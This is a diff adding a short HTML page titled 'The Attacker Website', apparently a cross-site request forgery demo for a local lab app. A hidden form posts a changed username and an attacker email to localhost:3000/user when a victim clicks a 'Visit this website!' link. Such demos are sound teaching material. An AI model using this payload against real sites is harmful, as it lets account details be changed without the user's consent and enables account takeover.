@@ -1,0 +1,19 @@
+<html lang=en>
+  <head>
+    <meta charset=utf-8>
+    <title>The Attacker Website</title>
+    <link rel="stylesheet" type="text/css" href="css/tacit-css.min.css"/>
+  </head>
+  <body>
+    <h1>The Attacker Website</h1>
+
+    <section>
+      <form method="post" action="http://localhost:3000/user">
+          <input type="hidden" name="username" value="The Attacker">
+          <input type="hidden" name="email" value="theattacker@attacker.com">
+      </form>
+      <a href="#" onclick="document.forms[0].submit()">Visit this website!</a>
+    </section>
+    
+  </body>
+</html>
